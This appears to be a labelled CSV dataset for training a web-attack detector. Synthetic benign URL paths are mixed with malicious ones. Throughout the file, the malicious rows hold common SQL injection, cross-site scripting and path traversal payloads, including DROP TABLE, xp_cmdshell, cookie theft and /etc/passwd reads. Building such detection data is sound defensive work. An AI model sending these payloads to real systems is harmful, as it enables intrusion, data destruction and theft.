payload,label
/index.html?search=../../../../etc/passwd,1
/checkout?id=12,0
/login?category=tech906,0
/dashboard?search=?id=1; DROP TABLE users,1
/checkout?category=tech298,0
/about?sort=asc368,0
/api/users?user=urmit736,0
/products/item?id=1390,0
/onload=prompt(1),1
/dashboard,0
/api/users?page=2764,0
/contact?category=tech625,0
"/UNION SELECT username, password FROM users",1
/login?page=2488,0
/login,0
/contact?id=1890,0
/products/item?sort=asc170,0
/dashboard?page=2921,0
/products/item?search=javascript:eval('var a=1'),1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?page=2148,0
/contact?id=1496,0
/checkout?category=tech131,0
/dashboard?page=2469,0
/products/item?user=urmit151,0
/dashboard?id=1866,0
/checkout?category=tech739,0
/api/users?page=2309,0
/login?page=2694,0
/api/users?category=tech685,0
/dashboard?sort=asc285,0
/contact?page=2288,0
/' OR '1'='1,1
/api/users?user=urmit124,0
/checkout?id=131,0
/api/users?user=urmit417,0
/index.html?id=1524,0
/index.html?sort=asc693,0
/login?category=tech444,0
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?id=1583,0
/checkout?category=tech752,0
/<script>alert(document.cookie)</script>,1
/login?id=1327,0
/checkout?id=1454,0
/index.html?page=2256,0
/api/users?sort=asc183,0
/api/users,0
/about?sort=asc528,0
/checkout?page=252,0
/dashboard,0
/checkout?page=2741,0
/about?id=1664,0
/checkout?id=1263,0
/index.html,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/index.html?sort=asc7,0
/checkout?page=2185,0
/login?search=' OR '1'='1,1
/login?category=tech153,0
/dashboard?category=tech798,0
/contact?page=2145,0
/index.html?user=urmit25,0
/admin' --,1
"/"" OR 1=1 --",1
/dashboard?sort=asc966,0
/index.html?search=../../../windows/system32/cmd.exe,1
/'; EXEC xp_cmdshell('dir');--,1
/dashboard?user=urmit232,0
/api/users?sort=asc155,0
/dashboard?id=182,0
/index.html,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?page=2490,0
/contact?user=urmit35,0
/admin' --,1
/../../../../etc/passwd,1
/index.html?page=2125,0
/checkout?page=2625,0
/index.html?page=2468,0
/checkout?user=urmit515,0
/checkout?sort=asc446,0
/dashboard?id=1715,0
/products/item?user=urmit920,0
/checkout?id=180,0
/contact?search=?id=1; DROP TABLE users,1
/about?page=2895,0
/index.html?page=2334,0
/onload=prompt(1),1
/checkout,0
/index.html?user=urmit92,0
/dashboard?category=tech101,0
/login?user=urmit671,0
/login?search=?id=1; DROP TABLE users,1
/login?page=2350,0
/index.html?category=tech630,0
/about,0
/dashboard?id=1583,0
/login?user=urmit709,0
/about?page=292,0
/products/item?sort=asc23,0
/dashboard?category=tech15,0
/index.html?page=28,0
/products/item?id=166,0
/<script>alert(document.cookie)</script>,1
/products/item?search=<script>alert(document.cookie)</script>,1
/products/item?sort=asc14,0
/index.html?sort=asc813,0
/contact?user=urmit462,0
/login?sort=asc839,0
/about?sort=asc964,0
/login,0
/about?user=urmit870,0
/login?page=2696,0
/checkout?sort=asc619,0
/products/item?page=2876,0
/dashboard,0
/checkout?search=../../../windows/system32/cmd.exe,1
/index.html?user=urmit447,0
/index.html,0
/contact,0
/login?page=2476,0
/index.html,0
/api/users?category=tech78,0
/?id=1; DROP TABLE users,1
/products/item?category=tech394,0
"/about?search="" OR 1=1 --",1
/' OR '1'='1,1
/api/users,0
/api/users?sort=asc82,0
/products/item,0
/index.html?id=155,0
/contact?user=urmit833,0
/contact?user=urmit575,0
/../../../../etc/passwd,1
/login?page=269,0
/products/item?search=<script>alert(document.cookie)</script>,1
/dashboard?id=1554,0
/index.html?page=2735,0
/products/item?sort=asc417,0
/api/users?category=tech528,0
/contact?category=tech432,0
/login?category=tech899,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?user=urmit172,0
/checkout,0
/about?id=1207,0
/../../../windows/system32/cmd.exe,1
/' OR '1'='1,1
/login?id=1974,0
/dashboard?id=1536,0
/products/item,0
/api/users?user=urmit130,0
/products/item?sort=asc100,0
/checkout?id=1134,0
/api/users?id=1227,0
/login,0
/javascript:eval('var a=1'),1
/../../../../etc/passwd,1
/products/item,0
/contact?category=tech32,0
/login?sort=asc133,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?category=tech448,0
/api/users?search=' OR '1'='1,1
/products/item?category=tech565,0
/api/users?sort=asc984,0
/checkout?page=2159,0
/dashboard?user=urmit616,0
/api/users?sort=asc363,0
/checkout,0
/login?sort=asc613,0
/checkout?id=1592,0
/contact?sort=asc530,0
/checkout?user=urmit698,0
/contact?search=?id=1; DROP TABLE users,1
/contact?category=tech288,0
/contact?page=2417,0
/checkout,0
/contact?sort=asc420,0
/contact,0
/onload=prompt(1),1
/products/item?category=tech117,0
/login?search=<script>alert(document.cookie)</script>,1
/api/users?page=2830,0
/about,0
/checkout?category=tech313,0
/login?category=tech351,0
/checkout?search=../../../windows/system32/cmd.exe,1
/api/users?category=tech440,0
/about?search=admin' --,1
/api/users?search=javascript:eval('var a=1'),1
/index.html?page=240,0
/contact?id=1847,0
/checkout?page=2515,0
/about?user=urmit422,0
/<script>alert(document.cookie)</script>,1
/api/users?user=urmit644,0
/' OR '1'='1,1
/about?sort=asc717,0
/dashboard?category=tech596,0
/checkout,0
/api/users?sort=asc769,0
/dashboard?page=2997,0
/'; EXEC xp_cmdshell('dir');--,1
/contact?category=tech899,0
/checkout?sort=asc380,0
/login?page=2319,0
/about?page=21,0
/index.html?category=tech720,0
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?id=1871,0
/dashboard?category=tech720,0
/index.html?user=urmit174,0
/dashboard,0
/about,0
/login?category=tech221,0
/contact?user=urmit139,0
/checkout?category=tech487,0
/api/users?id=1826,0
/dashboard?category=tech205,0
/index.html?id=1435,0
/dashboard?sort=asc182,0
/contact,0
/login,0
/login?page=2119,0
/index.html?sort=asc205,0
/checkout?id=1199,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?id=1793,0
/checkout?search=onload=prompt(1),1
/login?page=2685,0
/checkout,0
"/UNION SELECT username, password FROM users",1
/about?id=1247,0
"/"" OR 1=1 --",1
/dashboard?page=2526,0
/about,0
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard,0
/index.html?id=199,0
/products/item?search=?id=1; DROP TABLE users,1
/contact?user=urmit314,0
/api/users?category=tech735,0
/contact?sort=asc194,0
/index.html?id=1358,0
/products/item?user=urmit488,0
/products/item?page=2505,0
/login?category=tech976,0
/onload=prompt(1),1
/about?search=' OR '1'='1,1
/api/users?id=1609,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/login?category=tech532,0
/contact?user=urmit42,0
/checkout?sort=asc306,0
/login,0
/products/item?category=tech75,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?category=tech274,0
/'; EXEC xp_cmdshell('dir');--,1
/login?page=2191,0
/products/item?id=1346,0
/api/users?search='; EXEC xp_cmdshell('dir');--,1
/index.html?sort=asc798,0
/<script>alert(document.cookie)</script>,1
/products/item?category=tech529,0
/login,0
/login,0
/index.html?page=2318,0
/index.html,0
/index.html?id=1981,0
/dashboard?sort=asc659,0
"/"" OR 1=1 --",1
/index.html?sort=asc135,0
/login,0
/checkout?id=1208,0
/dashboard?category=tech388,0
/login?category=tech338,0
/contact?search=admin' --,1
/contact?user=urmit689,0
/contact?category=tech924,0
/about?category=tech668,0
/login?sort=asc37,0
/api/users?sort=asc461,0
"/api/users?search=UNION SELECT username, password FROM users",1
/about?id=1580,0
/about?id=1502,0
/products/item?page=2703,0
/api/users?category=tech426,0
/dashboard,0
/<script>alert(document.cookie)</script>,1
/products/item?page=2184,0
/about?category=tech319,0
/api/users?sort=asc820,0
/checkout?user=urmit104,0
/api/users?category=tech547,0
/index.html,0
/index.html,0
/index.html?user=urmit130,0
/checkout?sort=asc715,0
/index.html?page=2530,0
/contact?page=2276,0
/api/users?user=urmit957,0
/api/users,0
/about,0
/login?page=2425,0
/checkout?user=urmit431,0
/about?user=urmit682,0
/checkout?page=2137,0
/login?category=tech254,0
/dashboard?id=1528,0
/about?sort=asc248,0
/api/users?page=2214,0
/contact?sort=asc896,0
/login?user=urmit206,0
/login?sort=asc35,0
/checkout?page=2188,0
/dashboard?page=2484,0
"/UNION SELECT username, password FROM users",1
/api/users?category=tech34,0
/login?user=urmit401,0
/products/item?sort=asc669,0
/products/item?page=2850,0
/checkout?page=2254,0
/api/users?category=tech769,0
/products/item?search=admin' --,1
/index.html?page=2835,0
"/index.html?search="" OR 1=1 --",1
/?id=1; DROP TABLE users,1
/about,0
/about,0
/contact,0
/about?id=1113,0
/login?sort=asc939,0
/dashboard?category=tech844,0
/contact?page=2419,0
/'; EXEC xp_cmdshell('dir');--,1
/about?id=1880,0
/index.html,0
"/contact?search=UNION SELECT username, password FROM users",1
/login?category=tech145,0
/contact?page=2187,0
/products/item?user=urmit657,0
/contact?user=urmit432,0
/dashboard?id=1623,0
/contact?sort=asc774,0
"/UNION SELECT username, password FROM users",1
/login?id=1417,0
/dashboard?category=tech998,0
/index.html?page=2256,0
/dashboard?category=tech519,0
/products/item,0
/contact?user=urmit185,0
/api/users?id=1660,0
/../../../windows/system32/cmd.exe,1
/contact?sort=asc801,0
/../../../windows/system32/cmd.exe,1
/contact?id=174,0
/contact?category=tech510,0
/dashboard?page=2780,0
/index.html?user=urmit882,0
/checkout?search=admin' --,1
/about?category=tech856,0
/checkout?sort=asc596,0
/api/users?page=2959,0
/products/item?category=tech95,0
/products/item?id=1989,0
/about?category=tech219,0
/login?id=1490,0
/' OR '1'='1,1
/about?page=2551,0
/login?page=2683,0
/login?page=2133,0
/onload=prompt(1),1
/login?search=?id=1; DROP TABLE users,1
/about,0
/' OR '1'='1,1
/about?page=2269,0
/contact,0
/index.html,0
/login?category=tech886,0
/products/item?category=tech721,0
/about?page=2570,0
/about?category=tech244,0
/api/users?page=2351,0
/dashboard?category=tech807,0
/api/users,0
/login?id=1887,0
/products/item?page=2675,0
/contact,0
/index.html?user=urmit379,0
/index.html,0
/contact?page=2968,0
/about?sort=asc388,0
/about,0
"/UNION SELECT username, password FROM users",1
/dashboard,0
/products/item,0
/api/users?page=2705,0
/api/users?id=1396,0
/contact?id=1314,0
/products/item?search=../../../../etc/passwd,1
/about?page=2866,0
/login?id=1342,0
/dashboard?sort=asc270,0
/admin' --,1
/login?page=2640,0
/products/item?sort=asc764,0
/login?page=2145,0
/about?sort=asc156,0
/api/users?category=tech272,0
/contact?id=1324,0
/about?category=tech492,0
/checkout?sort=asc141,0
/dashboard?sort=asc710,0
/about?search=' OR '1'='1,1
/contact?id=1416,0
/api/users?page=2426,0
/products/item?user=urmit955,0
/api/users,0
/login,0
/index.html?page=2912,0
/contact?id=1673,0
/contact?id=1803,0
/contact?id=1449,0
/api/users,0
/products/item?page=219,0
/api/users?search=onload=prompt(1),1
/index.html,0
/dashboard?user=urmit497,0
/products/item?category=tech483,0
/index.html?page=2609,0
"/dashboard?search="" OR 1=1 --",1
"/login?search="" OR 1=1 --",1
/dashboard?sort=asc261,0
/index.html?user=urmit453,0
/about?page=2743,0
/admin' --,1
/' OR '1'='1,1
/onload=prompt(1),1
/products/item?id=1915,0
/index.html?page=2476,0
"/contact?search="" OR 1=1 --",1
/about?search=?id=1; DROP TABLE users,1
/index.html?user=urmit830,0
/checkout?user=urmit401,0
/login,0
/api/users?sort=asc557,0
/index.html?user=urmit487,0
"/"" OR 1=1 --",1
/about?category=tech571,0
/products/item?category=tech726,0
/api/users?sort=asc842,0
/index.html?category=tech251,0
/dashboard?page=2796,0
/checkout?id=1821,0
/about?id=1943,0
/dashboard?sort=asc70,0
/api/users?user=urmit201,0
/contact?sort=asc954,0
/about?user=urmit325,0
/onload=prompt(1),1
/api/users?category=tech847,0
/dashboard?search=' OR '1'='1,1
/checkout?id=1551,0
/about?id=1863,0
/index.html?user=urmit130,0
/products/item?category=tech503,0
/login?user=urmit901,0
/index.html?id=1639,0
"/checkout?search="" OR 1=1 --",1
/products/item?user=urmit598,0
/about?user=urmit52,0
/login?id=1631,0
/contact?category=tech162,0
/products/item?id=1758,0
/index.html?user=urmit30,0
/api/users?sort=asc561,0
/index.html?sort=asc988,0
/checkout?id=1768,0
/api/users?sort=asc528,0
/checkout?id=1295,0
/checkout?id=1402,0
/index.html,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?page=2845,0
/contact,0
/checkout,0
/'; EXEC xp_cmdshell('dir');--,1
/api/users?user=urmit146,0
/<script>alert(document.cookie)</script>,1
/api/users?page=2228,0
"/UNION SELECT username, password FROM users",1
/login,0
/api/users?id=1183,0
/login?sort=asc329,0
/login?user=urmit845,0
/../../../../etc/passwd,1
/index.html?id=1388,0
/products/item?id=1225,0
/contact?category=tech804,0
/login?category=tech46,0
/about,0
/about?sort=asc307,0
/index.html?category=tech269,0
/contact,0
/about,0
/dashboard?search=admin' --,1
/api/users?sort=asc489,0
/api/users?id=1664,0
/products/item?user=urmit125,0
/contact?category=tech423,0
/login?category=tech530,0
/contact?id=1493,0
/api/users?user=urmit797,0
"/about?search=UNION SELECT username, password FROM users",1
/login?sort=asc821,0
/products/item,0
/?id=1; DROP TABLE users,1
/contact?page=2803,0
/products/item?page=2630,0
/checkout?sort=asc276,0
/contact?id=1670,0
/api/users?user=urmit541,0
/index.html?user=urmit878,0
/dashboard?category=tech446,0
/api/users?category=tech100,0
/api/users,0
/dashboard?category=tech795,0
/index.html?sort=asc171,0
/index.html?search=../../../windows/system32/cmd.exe,1
/api/users?id=1442,0
/login?user=urmit94,0
/checkout?sort=asc874,0
/login?search=admin' --,1
/login?user=urmit29,0
/dashboard?page=276,0
/' OR '1'='1,1
/'; EXEC xp_cmdshell('dir');--,1
/index.html?sort=asc631,0
/products/item?category=tech152,0
/api/users,0
/products/item?search=<script>alert(document.cookie)</script>,1
/dashboard?page=2905,0
/login?id=1292,0
/api/users?sort=asc57,0
/dashboard?sort=asc732,0
/../../../windows/system32/cmd.exe,1
/checkout?user=urmit59,0
/index.html?user=urmit42,0
/products/item?id=1248,0
/about,0
/contact?page=2652,0
/contact?sort=asc1,0
"/"" OR 1=1 --",1
/index.html,0
/checkout?category=tech836,0
/index.html,0
/checkout?category=tech192,0
/login,0
/products/item?sort=asc742,0
/login?sort=asc251,0
/contact?search=onload=prompt(1),1
/dashboard?category=tech184,0
/contact?sort=asc262,0
/dashboard?page=2350,0
/index.html?page=2339,0
/contact?page=2758,0
/index.html?sort=asc647,0
/api/users?search=admin' --,1
/contact?user=urmit421,0
/onload=prompt(1),1
/dashboard?sort=asc435,0
/products/item?page=2271,0
/about?page=2226,0
/index.html?page=2978,0
/about?search=javascript:eval('var a=1'),1
"/api/users?search="" OR 1=1 --",1
/login?user=urmit55,0
/about?id=1550,0
/contact?sort=asc902,0
/about,0
/products/item?id=1615,0
/about?id=1448,0
/products/item?id=1354,0
/dashboard,0
/api/users?user=urmit791,0
/products/item?category=tech718,0
/contact?page=2712,0
/api/users?id=159,0
/products/item?id=1107,0
/' OR '1'='1,1
/products/item,0
/login?id=1444,0
/login?page=2640,0
/products/item?search=../../../../etc/passwd,1
/dashboard,0
/javascript:eval('var a=1'),1
/checkout?page=2107,0
/login,0
/index.html?category=tech839,0
/javascript:eval('var a=1'),1
/dashboard?user=urmit117,0
/checkout?page=2896,0
/dashboard?search=admin' --,1
/login?user=urmit273,0
/about?search=admin' --,1
/dashboard?id=1489,0
/index.html?search=' OR '1'='1,1
/javascript:eval('var a=1'),1
/checkout?sort=asc415,0
/index.html?id=1795,0
/index.html?user=urmit651,0
/index.html?category=tech254,0
/about?sort=asc615,0
/'; EXEC xp_cmdshell('dir');--,1
/api/users?page=2995,0
/about?search=<script>alert(document.cookie)</script>,1
/products/item?search=<script>alert(document.cookie)</script>,1
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?sort=asc220,0
/products/item?id=1190,0
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?id=1902,0
/checkout?sort=asc533,0
/about?sort=asc733,0
/<script>alert(document.cookie)</script>,1
"/UNION SELECT username, password FROM users",1
/login?sort=asc441,0
/checkout?user=urmit261,0
/about?search='; EXEC xp_cmdshell('dir');--,1
/index.html,0
/index.html?page=219,0
/contact?user=urmit965,0
/index.html,0
/products/item?user=urmit905,0
/contact?category=tech896,0
/contact?user=urmit164,0
/' OR '1'='1,1
/dashboard?page=2294,0
/dashboard?id=132,0
/dashboard?page=2486,0
/../../../windows/system32/cmd.exe,1
/contact?sort=asc3,0
/checkout,0
/contact?sort=asc59,0
/checkout?sort=asc850,0
/login?page=2871,0
/about?sort=asc989,0
/checkout?page=2614,0
/checkout?search=<script>alert(document.cookie)</script>,1
/login?category=tech621,0
/login?id=1265,0
/login,0
/' OR '1'='1,1
/'; EXEC xp_cmdshell('dir');--,1
/products/item?category=tech332,0
/login?id=1582,0
/index.html?page=216,0
/about?category=tech513,0
/products/item?user=urmit952,0
/index.html,0
/api/users?category=tech12,0
/index.html?user=urmit118,0
/checkout?sort=asc507,0
/checkout?category=tech101,0
/products/item?page=2937,0
/login?page=2391,0
/index.html?search=admin' --,1
/<script>alert(document.cookie)</script>,1
/about?id=1166,0
/index.html?category=tech39,0
/api/users?category=tech174,0
/checkout?id=1422,0
/dashboard?user=urmit786,0
/dashboard?user=urmit871,0
/api/users?search=../../../windows/system32/cmd.exe,1
/index.html?sort=asc565,0
/login?category=tech404,0
/products/item,0
/login?page=2308,0
/index.html?page=217,0
/login?search=admin' --,1
/api/users?category=tech178,0
/contact?id=112,0
/api/users,0
/contact?category=tech442,0
/about?sort=asc832,0
/contact?user=urmit508,0
/contact?sort=asc720,0
/contact,0
/checkout?page=2862,0
"/"" OR 1=1 --",1
/checkout?user=urmit794,0
/login?category=tech193,0
/checkout?category=tech462,0
/api/users,0
/api/users?sort=asc491,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/api/users?category=tech849,0
/contact?id=1350,0
/dashboard?sort=asc757,0
/dashboard?user=urmit647,0
/products/item?search=javascript:eval('var a=1'),1
/dashboard?sort=asc672,0
/api/users?page=2647,0
/checkout?user=urmit510,0
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?page=2653,0
/contact?id=1352,0
/about?page=2680,0
/login,0
/api/users?sort=asc52,0
/about?category=tech482,0
/checkout?search='; EXEC xp_cmdshell('dir');--,1
/about?page=2661,0
/contact,0
/checkout?user=urmit933,0
/products/item?id=1826,0
/index.html?sort=asc839,0
/contact?category=tech533,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?search=../../../windows/system32/cmd.exe,1
/checkout?sort=asc433,0
/about?sort=asc259,0
/api/users?page=2571,0
/index.html,0
/api/users?sort=asc110,0
/contact?category=tech704,0
/contact?category=tech184,0
/products/item?user=urmit44,0
"/UNION SELECT username, password FROM users",1
/index.html?sort=asc566,0
/products/item?sort=asc252,0
"/index.html?search=UNION SELECT username, password FROM users",1
/index.html?category=tech620,0
/dashboard?page=256,0
/api/users,0
/products/item?page=2992,0
/products/item?category=tech746,0
"/UNION SELECT username, password FROM users",1
/index.html?category=tech575,0
/checkout?category=tech854,0
/login?sort=asc20,0
/login?sort=asc6,0
/../../../windows/system32/cmd.exe,1
/dashboard?category=tech634,0
/?id=1; DROP TABLE users,1
/contact?page=2412,0
/login,0
/api/users?id=1705,0
/index.html,0
/contact?page=2519,0
/about,0
/about?category=tech588,0
/about?user=urmit564,0
/about,0
/checkout,0
/api/users?page=2197,0
/contact?user=urmit168,0
/contact?search=javascript:eval('var a=1'),1
/api/users?page=2550,0
/' OR '1'='1,1
/about?page=2423,0
/products/item?page=2340,0
/login?sort=asc172,0
/login?user=urmit312,0
/products/item?sort=asc233,0
/products/item?category=tech526,0
/dashboard?user=urmit441,0
/login?search=?id=1; DROP TABLE users,1
/login?id=1215,0
/login?user=urmit718,0
/api/users?sort=asc943,0
/dashboard?category=tech210,0
/contact?id=187,0
/contact?category=tech309,0
/dashboard?id=1658,0
/about?category=tech989,0
/dashboard?search=../../../../etc/passwd,1
/index.html?category=tech103,0
/checkout,0
/products/item?page=2901,0
/products/item?search=../../../../etc/passwd,1
"/UNION SELECT username, password FROM users",1
/about?category=tech751,0
/about?id=1737,0
/api/users?user=urmit772,0
/api/users?user=urmit779,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?id=1763,0
/api/users?category=tech43,0
/admin' --,1
/api/users,0
/products/item,0
/login,0
/contact?page=2419,0
/products/item,0
/products/item?page=2460,0
"/products/item?search="" OR 1=1 --",1
/api/users?page=2887,0
/checkout?page=2953,0
/index.html?search=admin' --,1
/<script>alert(document.cookie)</script>,1
/about?id=1817,0
/api/users?id=1421,0
/about?id=1970,0
/api/users?sort=asc777,0
/login?id=1520,0
/login?user=urmit355,0
/checkout?id=1482,0
/<script>alert(document.cookie)</script>,1
/dashboard?page=2245,0
/index.html?category=tech627,0
/products/item?user=urmit590,0
/checkout?sort=asc791,0
/../../../windows/system32/cmd.exe,1
/checkout?category=tech830,0
/login,0
/dashboard?search=admin' --,1
/index.html?category=tech740,0
/login?id=1898,0
/about?category=tech480,0
/api/users,0
/index.html?category=tech359,0
/dashboard,0
/api/users?page=2528,0
/contact?sort=asc141,0
/checkout?page=235,0
/contact?category=tech594,0
/dashboard?page=2192,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech231,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about,0
/about?category=tech63,0
/api/users?user=urmit182,0
/about?search=onload=prompt(1),1
/dashboard?category=tech537,0
/checkout?sort=asc560,0
/contact,0
/checkout?page=2212,0
/index.html?search=<script>alert(document.cookie)</script>,1
/login?page=268,0
/api/users?category=tech395,0
/api/users?user=urmit913,0
/products/item?page=2721,0
/contact?user=urmit979,0
/about?sort=asc474,0
/dashboard?page=2555,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?sort=asc232,0
/dashboard?page=2723,0
/api/users?search=../../../windows/system32/cmd.exe,1
/dashboard?user=urmit463,0
/about?id=1239,0
/about?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users,0
/index.html,0
/onload=prompt(1),1
/index.html?user=urmit913,0
/contact?sort=asc172,0
/checkout?sort=asc492,0
/products/item?category=tech95,0
/about?page=2470,0
/products/item?sort=asc119,0
/contact?search=?id=1; DROP TABLE users,1
/about?category=tech900,0
/about?page=273,0
/index.html?id=1382,0
/login?sort=asc489,0
/api/users?search=javascript:eval('var a=1'),1
/api/users?category=tech506,0
/products/item?category=tech475,0
/checkout?id=1257,0
/dashboard,0
/index.html?search=<script>alert(document.cookie)</script>,1
/products/item,0
/javascript:eval('var a=1'),1
/login?sort=asc729,0
/index.html?sort=asc248,0
/products/item?id=1165,0
/' OR '1'='1,1
/about?page=2910,0
/dashboard?page=2275,0
"/contact?search="" OR 1=1 --",1
/dashboard?user=urmit867,0
/'; EXEC xp_cmdshell('dir');--,1
/contact?sort=asc960,0
/api/users?sort=asc163,0
/api/users?id=1803,0
/dashboard?sort=asc325,0
/checkout?sort=asc646,0
/api/users?sort=asc616,0
"/products/item?search=UNION SELECT username, password FROM users",1
/products/item?category=tech748,0
/checkout?user=urmit655,0
/api/users,0
/index.html?id=1494,0
/about?search=' OR '1'='1,1
/api/users?id=1384,0
/api/users,0
/checkout?sort=asc844,0
/products/item?sort=asc407,0
/products/item?id=1478,0
/contact?sort=asc699,0
/dashboard?category=tech410,0
/products/item?search=../../../windows/system32/cmd.exe,1
/' OR '1'='1,1
/products/item?id=1114,0
/about?user=urmit371,0
/about?page=230,0
/products/item?search=' OR '1'='1,1
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?user=urmit780,0
/dashboard,0
/about?category=tech336,0
/checkout?id=182,0
/checkout?user=urmit974,0
/index.html?page=2193,0
/api/users?sort=asc775,0
/' OR '1'='1,1
/checkout,0
"/dashboard?search=UNION SELECT username, password FROM users",1
"/UNION SELECT username, password FROM users",1
/login?user=urmit522,0
/dashboard?user=urmit785,0
/index.html?category=tech564,0
/checkout?user=urmit551,0
/api/users?sort=asc614,0
/about?page=2316,0
/login?id=190,0
/api/users?page=2546,0
/?id=1; DROP TABLE users,1
/about?page=2269,0
/login?category=tech857,0
/products/item?page=2714,0
/login?sort=asc346,0
/api/users?id=1414,0
/login?id=1260,0
/api/users?user=urmit593,0
/?id=1; DROP TABLE users,1
/about?sort=asc747,0
/javascript:eval('var a=1'),1
/index.html?id=1209,0
/dashboard?sort=asc714,0
"/"" OR 1=1 --",1
/contact?search='; EXEC xp_cmdshell('dir');--,1
/about?page=258,0
/login?sort=asc97,0
/dashboard?sort=asc257,0
/products/item?sort=asc737,0
/products/item?user=urmit26,0
/contact?category=tech604,0
/api/users?page=2234,0
/products/item?user=urmit849,0
/about?user=urmit567,0
"/"" OR 1=1 --",1
/dashboard?sort=asc487,0
/about?page=242,0
/login?user=urmit4,0
/login?user=urmit823,0
/dashboard?id=1787,0
/index.html?user=urmit949,0
/contact?page=2484,0
/?id=1; DROP TABLE users,1
/<script>alert(document.cookie)</script>,1
/checkout?category=tech51,0
/contact?sort=asc696,0
/api/users?search=<script>alert(document.cookie)</script>,1
/products/item?sort=asc124,0
/products/item?user=urmit889,0
/contact?category=tech683,0
/index.html?search=../../../../etc/passwd,1
/api/users?category=tech871,0
"/"" OR 1=1 --",1
/dashboard?sort=asc273,0
/contact?search=?id=1; DROP TABLE users,1
/checkout?id=1123,0
/products/item?search=' OR '1'='1,1
/contact?page=2681,0
/about?sort=asc489,0
/checkout?user=urmit804,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?id=1279,0
/products/item?id=1149,0
/checkout?user=urmit160,0
/contact?page=2465,0
/about?page=2451,0
/login?category=tech218,0
/login?id=1945,0
/dashboard,0
/products/item?category=tech146,0
/api/users?category=tech224,0
/contact?search=onload=prompt(1),1
/contact?category=tech90,0
/api/users?user=urmit993,0
/contact?sort=asc486,0
/products/item?page=279,0
/index.html?sort=asc665,0
/api/users?id=1518,0
/checkout?page=2295,0
/products/item?page=2206,0
/products/item?id=1348,0
/onload=prompt(1),1
/checkout,0
/login,0
/dashboard?category=tech507,0
/' OR '1'='1,1
/checkout?category=tech449,0
/index.html?user=urmit589,0
/products/item?page=227,0
/about?search=javascript:eval('var a=1'),1
/dashboard,0
/dashboard?user=urmit451,0
/login,0
/login?user=urmit92,0
/javascript:eval('var a=1'),1
/products/item?id=1994,0
/dashboard?category=tech243,0
/index.html,0
/<script>alert(document.cookie)</script>,1
/products/item?search=' OR '1'='1,1
/api/users?category=tech623,0
/<script>alert(document.cookie)</script>,1
/login,0
/api/users?search=../../../../etc/passwd,1
/index.html?page=2531,0
/api/users?search=../../../windows/system32/cmd.exe,1
/checkout?user=urmit795,0
/checkout?page=228,0
/checkout,0
/onload=prompt(1),1
/dashboard?user=urmit760,0
/checkout,0
/about?category=tech954,0
/login,0
/about?page=238,0
/dashboard,0
/index.html?page=2645,0
/?id=1; DROP TABLE users,1
/checkout?user=urmit378,0
/../../../windows/system32/cmd.exe,1
/index.html?id=1975,0
/contact?page=2818,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
"/UNION SELECT username, password FROM users",1
/'; EXEC xp_cmdshell('dir');--,1
/index.html?user=urmit567,0
/about?sort=asc810,0
/about?id=1670,0
/about?page=2638,0
/login?page=2872,0
/products/item?category=tech968,0
/about,0
/products/item?user=urmit234,0
/products/item?id=1906,0
